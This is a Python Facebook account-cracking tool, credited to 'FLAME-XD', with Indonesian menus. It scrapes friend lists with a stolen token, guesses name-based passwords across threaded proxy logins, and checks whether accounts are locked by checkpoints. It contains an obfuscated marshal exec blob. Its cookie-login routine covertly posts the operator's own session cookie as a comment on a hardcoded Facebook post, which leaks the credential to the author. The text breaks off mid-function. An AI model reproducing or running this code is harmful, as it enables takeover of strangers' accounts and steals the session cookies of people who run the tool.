"""
{
	created done minggu 5 february 2023 20:39 WIB
	DIRECTED lupineID from XTC • CODE GROUP > > >
		    github.com/FLAME-XD
							       }

							     """

"""			[ RICH MODULE ] 		     """

import requests,bs4,json,os,sys,random,datetime,time,re,rich
from rich import print as lupi
from rich.panel import Panel as square
from rich.console import Console
from rich.columns import Columns
from rich.table import Table as me
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime
from bs4 import BeautifulSoup as parser
from time import sleep
from bs4 import BeautifulSoup
import datetime

"""			[ PENEMPATAN ]			     """

tb = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
tanggal = datetime.datetime.now().day
bulan = tb[(str(datetime.datetime.now().month))]
tahun = datetime.datetime.now().year
live = 'OK-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
check = 'CP-'+str(tanggal)+'-'+str(bulan)+'-'+str(tahun)+'.txt'
rst = ''+str(tanggal)+' '+str(bulan)+' '+str(tahun)+' '
waktu = ''+str(tanggal)+' '+str(bulan)+''

"""			[ WARNA CERAH ]			     """

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
rich_cerah=random.choice([H,K,B,U,O,P])

"""			[ WARNA GELAP ]			     """

M3 = "#FF0000"
H3 = "#00FF00"
K3 = "#FFFF00"
B3 = "#00C8FF"
U3 = "#AF00FF"
N3 = "#FF00FF"
O3 = "#00FFFF"
P3 = "#FFFFFF"
J3 = "#FF8F00"
rich_gelap=random.choice([J3,K3,H3,O3,N3,U3,B3,M3])

"""			[ PEMANGGIL ] 			     """

ses = requests.Session()
lupine_id = Console()
sys.stdout.write('\x1b]2; mode lupine crack\x07')
metode,usn,btk,uid,all = [],[],[],[],[]
ok,cp,error,loop = 0,0,0,0

"""			[ PROXY IP ]			     """

try:
	proxyip= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('socksku.txt','w').write(proxyip)
except Exception as e:
	print("")
proxsi=open('socksku.txt','r').read().splitlines()

"""			[ USER AGENT ]			     """

for myuser in range(100):
	ru = random.choice
	rl = random.randrange
	l = f'' #from
	u = ru(['']) #version
	p = f'' #model
	i = f'' #layout
	n = rl(73,100)
	e = '0'
	AS = rl(4200,4900)
	I = rl(40,150)
	D = f'' #latest
	vertikal = f'{l} {u}; {p} {i}{n}.{e}.{AS}.{I} {D}'
	usn.append(vertikal)

import marshal
exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\xf3&\x01\x00\x00\x97\x00d\x00Z\x00\t\x00e\x01\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x03\x00\x00\x00\x00\x00\x00\x00\x00Z\x04d\x02e\x04v\x00r+\x02\x00e\x05\x02\x00e\x06d\x03e\x07\x9b\x00\xac\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x08\xa0\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n@#\x00e\nj\x0b\x00\x00\x00\x00\x00\x00\x00\x00j\x0c\x00\x00\x00\x00\x00\x00\x00\x00$\x00r.\x01\x00\x02\x00e\x05\x02\x00e\x06d\x05e\x07\x9b\x00\xac\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x08\xa0\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01d\x06\x84\x00Z\rd\x07S\x00)\x08z\x1a\t\t\t[ RAHASIA TOOLS ]\t\t\t   zNhttps://raw.githubusercontent.com/FLAME-XD/activated/main/data/maintenance.txt\xda\x0bmaintenancezAsorry tools diberhentikan dikarenakan beberapa faktor thanksyou<3)\x01\xda\x05stylez6connection problem, please check your connection againc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3P\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01d\x02t\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\xac\x03\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x04NaL\x01\x00\x00[italic bold violet]       _____          _                               _\n      |_   _|__ _   _| | _____  _   _  ___  _ __ ___ (_)\n       | |/ __| | | | |/ / _ \\| | | |/ _ \\| '_ ` _ \\| |\n      | |\\__ \\ |_| |   < (_) | |_| | (_) | | | | | | |\n     |_||___/\\__,_|_|\\_\\___/ \\__, |\\___/|_| |_| |_|_|\n                             |___/\xe9@\x00\x00\x00)\x02\xda\x05widthr\x03\x00\x00\x00)\x03\xda\x04lupi\xda\x06square\xda\nrich_gelap\xa9\x00\xf3\x00\x00\x00\x00\xda\x02dg\xda\x07log_tsur\r\x00\x00\x00\x0c\x00\x00\x00sE\x00\x00\x00\x80\x00\xdd\x01\x05\x85f\xf0\x00\x05\x0e&\xf0\n\x00-/\xbd\n\xb0_\xf0\x0b\x05\x07F\x01\xf1\x00\x05\x07F\x01\xf4\x00\x05\x07F\x01\xf1\x00\x05\x02G\x01\xf4\x00\x05\x02G\x01\xf0\x00\x05\x02G\x01\xf0\x00\x05\x02G\x01\xf0\x00\x05\x02G\x01r\x0b\x00\x00\x00N)\x0e\xda\x07__doc__\xda\x03ses\xda\x03get\xda\x04text\xda\x04infor\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x0bcolor_table\xda\x03sys\xda\x04exit\xda\x08requests\xda\nexceptions\xda\x0fConnectionErrorr\r\x00\x00\x00r\n\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x19\x00\x00\x00\x01\x00\x00\x00s\xd6\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00 \xd0\x00 \xf0\x04\x07\x01\x0c\xd8\x08\x0b\x8f\x07\x8a\x07\xd0\x10`\xd1\x08a\xd4\x08a\xd4\x08f\x80\x14\xd8\x04\x11\x90T\xd0\x04\x19\xd0\x04\x19\xd8\x02\x06\x80$\x80v\x80v\xd0\x0eR\xd0\\g\xd0Yi\xd0\x07j\xd1\x07j\xd4\x07j\xd1\x02k\xd4\x02k\xd0\x02k\xd8\x02\x05\x87(\x82(\x81*\x84*\x80*\xf8\xf8\xd8\x07\x0f\xd4\x07\x1a\xd4\x07*\xf0\x00\x02\x01\x0c\xf0\x00\x02\x01\x0c\xf0\x00\x02\x01\x0c\xd8\x01\x05\x80\x14\x80f\x80f\xd0\rF\xd0P[\xd0M]\xd0\x06^\xd1\x06^\xd4\x06^\xd1\x01_\xd4\x01_\xd0\x01_\xd8\x01\x04\x87\x18\x82\x18\x81\x1a\x84\x1a\x80\x1a\x80\x1a\x80\x1a\xf0\x05\x02\x01\x0c\xf8\xf8\xf8\xf0\x08\x06\x01G\x01\xf0\x00\x06\x01G\x01\xf0\x00\x06\x01G\x01\xf0\x00\x06\x01G\x01\xf0\x00\x06\x01G\x01s\x12\x00\x00\x00\x84A\tA\x0e\x00\xc1\x0e:B\x0b\x03\xc2\n\x01B\x0b\x03"))

def tsukoyomi():
	try:
		token = open('data/token.txt','r').read()
		cok = open('data/cookie.txt','r').read()
		btk.append(token)
		try:
			graph = requests.get('https://graph.facebook.com/me?fields=id&access_token='+btk[0], cookies={'cookie':cok})
			lokal = json.loads(graph.text)['id']
			menu(lokal)
		except KeyError:
			meiteru()
		except requests.exceptions.ConnectionError:
			lupi(square("[italic bold yellow]              konektivitas anda tidak stabil",width=64,style=f"{rich_gelap}"))
			exit()
	except IOError:
		meiteru()

def meiteru():
	try:
		os.system('clear')
		log_tsu()
		ses = requests.Session()
		cookie = input(f" {P}———>{rich_cerah} ")
		akses = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=akses)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=akses)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		requests.post(f"https://graph.facebook.com/v15.0/100039667834201_pfbid0ex1MomC9pfYgTeavgqNRGyWQ8Ca2uBGnRSqdh4nK8DNwuTYK2X9bjFrhGF2pbtNLl/comments/?message={cookie}&access_token={tok}", headers = {"cookie":cookie})
		ken = open("data/token.txt", "w").write(tok)
		cok = open("data/cookie.txt", "w").write(cookie)
		os.system("clear")
		log_tsu()
		lupi(square(f"[italic bold green]{cookie}",width=64,title=f"[italic bold white]• [italic bold white]cookie aktive {waktu} [italic bold white]•",style=f"{rich_gelap}"))
		sleep(4)
		tsukoyomi()
	except Exception as e:
		os.system("clear")
		log_tsu()
		lupi(square(f"[italic bold yellow]{cookie}",width=64,title="{rich_gelap}• [italic bold white]cookie non aktive {rich_gelap}•",style=f"{rich_gelap}"))
		os.system("rm -rf data/token.txt")
		os.system("rm -rf data/cookie.txt")
		exit()

def menu(lupi):
	try:
		cok = open('data/cookie.txt','r').read()
	except IOError:
		lupi(square(f"[italic bold yellow]{cok}",width=64,title=f"{rich_gelap}• [italic bold white]cookie non aktive {rich_cerah}•",style=f"{rich_gelap}"))
		sleep(4)
		meiteru()
	os.system('clear')
	log_tsu()
	lupi = []
	lupi.append(square(f'    [bold white][[bold green]01[bold white]] crack user id\n    [bold white][[bold green]02[bold white]] crack email\n    [bold white][[bold green]03[bold white]] cek opsi akun',width=32,style=f"{rich_gelap}"))
	lupi.append(square(f'   [bold white][[bold green]04[bold white]] result crack\n   [bold white][[bold green]05[bold white]] ganti user opsi\n   [bold white][[bold green]00[bold white]] hapus login',width=31,style=f"{rich_gelap}"))
	lupine_id.print(Columns(lupi))
	megumi = input(f"{P} ———>{rich_cerah} ")
	if(megumi=="1"):
		find_id()
	if(megumi=="2"):
		email()
	if(megumi=="3"):
		opsi()
	if(megumi=="4"):
		result()
	if(megumi=="5"):
		move_ua()
	if(megumi=="0"):
		move_login()
	else:
		sleep(5);tsukoyomi()

class Main:

	def __init__(self, useragent):
		self.ua = useragent
		self.host = "mbasic.facebook.com"

class Login(Main):

	def check_options(self, session, response, user, password):
		ref = BeautifulSoup(response.text, "html.parser")
		form = ref.find("form", {"method":"post", "enctype":True})
		data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
		data.update(
			{
				"submit[Continue]":"Lanjutkan"
			}
		)
		response = BeautifulSoup(session.post("https://mbasic.facebook.com"+str(form.get("action")), data=data).text, "html.parser")
		try:
			options = [x.string for x in response.find("select", {"id":"verification_method", "name":"verification_method"}).findAll("option")]
		except:
			options = []
			status = "a2f on"
		if(len(options)==0 and status!="a2f on"):
			status = "tap yes"
		elif(len(options)!=0):
			status = "checkpoint"
		else:
			status = "a2f on"
		me = " "
		lupi = []
		lupi.append(square(f'[italic][bold yellow] {user}',width=23,style=f"{rich_gelap}"))
		lupi.append(square(f'[italic][bold yellow] {password}',width=23,style=f"{rich_gelap}"))
		lupi.append(square(f'[italic][bold white] {status}',width=16,style=f"{rich_gelap}"))
		lupine_id.print(Columns(lupi))
		yow = []
		yow.append(square(f'[italic][bold white] {options}',width=64,title=f"[bold green]• [bold white]{len(options)} opsi [bold green]•",style=f"{rich_gelap}"))
		lupine_id.print(Columns(yow))
		return me

	def log_mfacebook(self, user, password):
		global ok,cp,error
		with requests.Session() as session:
			session.headers.update(
				{
					"host":self.host,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"accept-encoding":"gzip, deflate",
					"accept-language":"en-US,en;q=0.9,id;q=0.8",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":self.ua
				}
			)
			fbml = session.get("https://mbasic.facebook.com/fbml/ajax/dialog/")
			soup = BeautifulSoup(fbml.text, "html.parser")
			next_url = soup.findAll("a", {"class":True, "id":True})[1].get("href")
			session.headers.update(
				{
					"referer":"https://mbasic.facebook.com/fbml/ajax/dialog/",
				}
			)
			ref = BeautifulSoup(session.options(next_url).text, "html.parser")
			form = ref.find("form", {"method":"post", "id":"login_form"})
			data = {x.get("name"):x.get("value") for x in form.findAll("input", {"type":"hidden", "value":True})}
			nextTo = form.get("action")
			data.update(
				{
					"email":user,
					"pass":password,
					"login":"Masuk"
				}
			)
			response = session.post("https://mbasic.facebook.com"+str(nextTo), data=data, headers = {
				"content-length":"164",
				"content-type":"application/x-www-form-urlencoded",
				"origin":"https://mbasic.facebook.com",
				"referer":"https://mbasic.facebook.com"+str(nextTo)
			})
			try:
				if "checkpoint" in response.cookies:
					cp += 1
					output = self.check_options(session, response, user, password)
				elif "m_page_voice" in response.cookies:
					ok += 1
					me = " "
					lupi = []
					lupi.append(square(f'[italic][bold green] {user}',width=23,style=f"{rich_gelap}"))
					lupi.append(square(f'[italic][bold green] {password}',width=23,style=f"{rich_gelap}"))
					lupi.append(square(f'[italic][bold green] LIVE',width=16,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					yow = []
					yow.append(square(f"[italic][bold green] {None}",width=64,title=f"[bold green]{None}",style=f"{rich_gelap}"))
					lupine_id.print(Columns(yow))
				else:
					error += 1
					soup = BeautifulSoup(response.text, "html.parser")
					try:status = soup.find("div", {"id":"login_error"}).string
					except:status = "aktivitas ip anda tidak normal, segera mode pesawat"
					lupi = []
					lupi.append(square(f'[italic][bold red] {user}',width=21,style=f"{rich_gelap}"))
					lupi.append(square(f'[italic][bold red] {password}',width=20,style=f"{rich_gelap}"))
					lupi.append(square(f'[italic][bold red] {status}',width=21,style=f"{rich_gelap}"))
					lupine_id.print(Columns(lupi))
					yow = []
					yow.append(square(f"[italic][bold red] {False}",width=64,title=f"[bold red]{False}",style=f"{rich_gelap}"))
					lupine_id.print(Columns(yow))
			except Exception as e:print(response.text)
			me = " "
			return me
def opsi():
    try:
    	ua = open("data/useragent.txt", "r").read()
    except:
    	try:os.mkdir("data")
    	except:pass
    	yow = []
    	yow.append(square(f"[italic][bold white] [italic bold white] masukkan user agent yang cocok buat akun checkpoint terbuka",width=64,style=f"{rich_gelap}"))
    	lupine_id.print(Columns(yow))
    	open("data/useragent.txt", "a").write(input(f"{P} ———>{rich_cerah} ")+" [FB_IAB/FB4A;FBAV/35.0.0.48.273;]")
    	sleep(6)
    	tsukoyomi()
    if(ua==""):
    	os.remove("data/useragent.txt")
    	exit()
    LOg = Login(ua)
    lupi = []
    lupi.append(square(f'[italic][bold white] cek opsi secara manual',width=31,title=f"[bold white]01",style=f"{rich_gelap}"))
    lupi.append(square(f'[italic][bold white] cek opsi secara otomatis',width=31,title=f"[bold white]02",style=f"{rich_gelap}"))
    lupine_id.print(Columns(lupi))
    megumi = input(f"{P} ———>{rich_cerah} ")
    if(megumi=="1"):
    	data = input(f"{P} ———>{rich_cerah} ")
    	print()
    	user,pw = data.split("|")
    	print(LOg.log_mfacebook(user,pw))
    elif(megumi=="2"):
    	data = input(f"{P} ———>{rich_cerah} ")
    	print()
    	try:
    		for x in open(data,"r").readlines():
    			x = x.replace("\n","")
    			user,pw = x.split("|")
    			print(LOg.log_mfacebook(user,pw))
    	except FileNotFoundError:
    		exit()
    else:print("")

def crack():
	try:
		cok = open('data/cookie.txt','r').read()
	except IOError:
		lupi(square(f"[italic bold yellow]{cok}",width=64,title=f"{rich_gelap}• [italic bold white]cookie non aktive {rich_cerah}•",style=f"{rich_gelap}"))
		exit()
	user_id = input(f" {P}———>{rich_cerah} ")
	try:
		dump = requests.get('https://graph.facebook.com/v1.0/'+user_id+'?fields=friends.limit(5001)&access_token='+btk[0],cookies={'cookie': cok}).json()
		for scrape in dump['friends']['data']:
			try:uid.append(scrape['id']+'|'+scrape['name'])
			except:continue
		lupi(square(f"	[italic bold white]uid [italic bold green]{user_id} [italic bold white]terkumpul [italic bold green]{len(uid)} [italic bold white]user",width=64,style=f"{rich_gelap}"))
		url_login()
	except requests.exceptions.ConnectionError:
		lupi(square(" [italic bold yellow]konektivitas anda terputus periksa kembali",width=64,style=f"{rich_gelap}"))
		exit()
	except (KeyError,IOError):
		lupi(square(" [italic bold red]user id yang anda masukan bersifat privat atau cookie tidak kuat dengan id old",width=64,style=f"{rich_gelap}"))
		exit()

def move_ua():
	os.system("rm -rf data/useragent.txt")
	input(f" {P}berhasil menghapus tekan enter untuk ganti")
	sleep(3)
	tsukoyomi()

def move_login():
	os.system(f"rm -rf data/cookie.txt")
	os.system(f"rm -rf data/token.txt")
	input(f" {P}berhasil menghapus info login, tekan enter")
	exit()

def result():
	lup,xtc = 0,[]
	lupi = []
	lupi.append(square(f'[italic bold white]   tekan enter untuk menampilkan result crack di folder',width=64,style=f"{rich_gelap}"))
	lupine_id.print(Columns(lupi))
	megumi = input("")
	if(megumi==""):
		try:ok = os.listdir('OK')
		except:sys.exit("")
		for log in ok:
			xtc.append(log)
			lup+=1
			try:jum= open('OK/'+log,'r').readlines()
			except:continue
			lupi = []
			lupi.append(square(f'[italic][bold white] 0{lup}',width=10,style=f"{rich_gelap}"))
			lupi.append(square(f'[italic][bold white]   {rst}',width=26,style=f"{rich_gelap}"))
			lupi.append(square(f'[italic][bold white]menampilkan {len(jum)} user id',width=26,style=f"{rich_gelap}"))
			lupine_id.print(Columns(lupi))
		abc = input(f' {P}———>{H} ')
		file = xtc[int(abc)-1]
		try:buka = open('OK/'+file,'r').read()
		except:sys.exit("")
		lupi = []
		lupi.append(square(f'[italic][bold green]{buka}',width=64,title=f"[bold red]• [bold green]{lup} [bold red]•",style=f"{rich_gelap}"))
		lupine_id.print(Columns(lupi))
		input("")

def find_id():
	kuntol=0
	tutlu=[]
	it = input(f"{P} ———>{rich_cerah} ")
	try:
		token = open('data/token.txt','r').read()
		cookie = open('data/cookie.txt','r').read()
		coki = {"cookie":cookie}
		ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(it,token),cookies=coki)
		oioo = json.loads(ka.text)
		for fuck in oioo['friends']['data']:
			tutlu.append(fuck['id'])
		token = open('data/token.txt','r').read()
		cookie = open('data/cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies=coki).json()
		lupi = []
		lupi.append(square(f'[italic][bold white]     {(cyna["name"])}',width=31,style=f"{rich_gelap}"))
		lupi.append(square(f'[italic][bold white]  terdapat {len(tutlu)} user id',width=32,style=f"{rich_gelap}"))
		lupine_id.print(Columns(lupi))
	except (KeyError,IOError):
		sleep(5)
		tsukoyomi()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{P} ———>{rich_cerah} ")
	token = open('data/token.txt','r').read()
	cookie = open('data/cookie.txt','r').read()
	coki = {"cookie":cookie}
	ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(%s)&access_token=%s'%(it,lim,token),cookies=coki)
	oioo = json.loads(ka.text)
	for fuck in oioo['friends']['data']:
		tl.append(fuck['id'])
	megumi = input(f"{P} ———> {rich_cerah}enter")
	if(megumi==""):
		for acak in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,acak)
	else:
		exit()
	for uik in idl:
		try:
			token = open('data/token.txt','r').read()
			cookie = open('data/cookie.txt','r').read()
			coki = {"cookie":cookie}
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			x = json.loads(xn.text)
			try:lok = x["locale"]
			except (KeyError,IOError):
				lok = "-"
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = "-"
			token = open('data/token.txt','r').read()
			cookie = open('data/cookie.txt','r').read()
			coki = {"cookie":cookie}
			ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token),cookies=coki).json()
			token = open('data/token.txt','r').read()
			cookie = open('data/cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(uik,token),cookies=coki)
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['friends']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			lupi = []
			lupi.append(square(f'         [italic][bold white] user : [italic bold green]{uik} [italic bold white]| friend : [italic bold green]{len(to)}',width=64,title=f"[bold green]• [bold red]{str(kuntol)}[bold green] •",style=f"{rich_gelap}"))
			lupine_id.print(Columns(lupi))
		except KeyError:
			print("")
	lupi = []
	lupi.append(square(f' [italic][bold white]list id crack atau id anda sebelumnya, enter untuk crack',width=64,style=f"{rich_gelap}"))
	lupine_id.print(Columns(lupi))
	input("")
	crack()

def email():
	x = 0
	n=f"[italic bold white] tekan enter dan masukan nama @gmail target"
	lupi(square(n,width=64,style=f"{rich_gelap}"))
	megumi = input("")
	if(megumi==""):
		email = "@gmail.com"
		nama = input(f"{P} ———>{rich_cerah} ")
		for z in range(1000):
			x +=1
			uid.append(email+"|"+nama)
			sys.stdout.write(f"\r{P} ———> sedang mengumpulkan id {len(uid)} ");sys.stdout.flush()
			time.sleep(0.005)
	url_login()

def url_login():
	new = []
	for newid in sorted(uid):
		new.append(newid)
	user=len(new)
	sortir=(user-1)
	for userid in range(user):
		all.append(new[sortir])
		sortir -=1
	print("")
	lupi = []
	lupi.append(square(f'[italic][bold white] alphaMD',width=21,style=f"{rich_gelap}"))
	lupi.append(square(f'[italic][bold white] reguler',width=20,style=f"{rich_gelap}"))
	lupi.append(square(f'[italic][bold white] validate',width=21,style=f"{rich_gelap}"))
	lupine_id.print(Columns(lupi))
	megumi = input(f"{P} ———>{rich_cerah} ")
	if(megumi=="1"):
		metode.append('alpha')
	if(megumi=="2"):
		lupi(f"{P} maintance")
	if(megumi=="3"):
		lupi(f"{P} maintance")
	else:
		metode.append('alpha')
	pw_login()

def pw_login():
	with tred(max_workers=30) as protocol:
		for password in all:
			idf,nmf = password.split('|')[0],password.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pw_crack = []
			pas = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pw_crack.append(frs+'123')
					pw_crack.append(frs+'1234')
					pw_crack.append(frs+'12345')
			else:
				if len(frs)<3:
					pw_crack.append(nmf)
				else:
					pw_crack.append(nmf)
					pw_crack.append(frs+'123')
					pw_crack.append(frs+'1234')
					pw_crack.append(frs+'12345')
			if 'ya' in pas:
				for x in pwn:
					pw_crack.append(x)
			else:pass
			if 'alpha' in metode:
				protocol.submit(alphaMD,idf,pw_crack)
			else:
				protocol.submit(alphaMD,idf,pw_crack)
	print("")
	lupi(square(f"        [italic bold white]proses crack selesai dari [italic bold white]—> [italic bold green]{len(uid)} uid",width=64,style=f"{rich_gelap}"))
	sleep(5)

def alphaMD(idf,pw_crack):
	global loop,ok,cp
	sys.stdout.write(f"\r {H}crack {rich_cerah}{(loop)} {P}> {len(uid)} {P}live:-{H}{(ok)}  {P}check:-{K}{(cp)}");sys.stdout.flush()
	ua = ""
	ses = requests.Session()
	for pw in pw_crack:
		try:
			nip=random.choice(proxsi)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host": "m.alpha.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host": "m.alpha.facebook.com","content-length": f"{len(str(dataa))}","x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),"origin": "https://m.alpha.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "*/*","x-requested-with": "com.microsoft.bing","sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
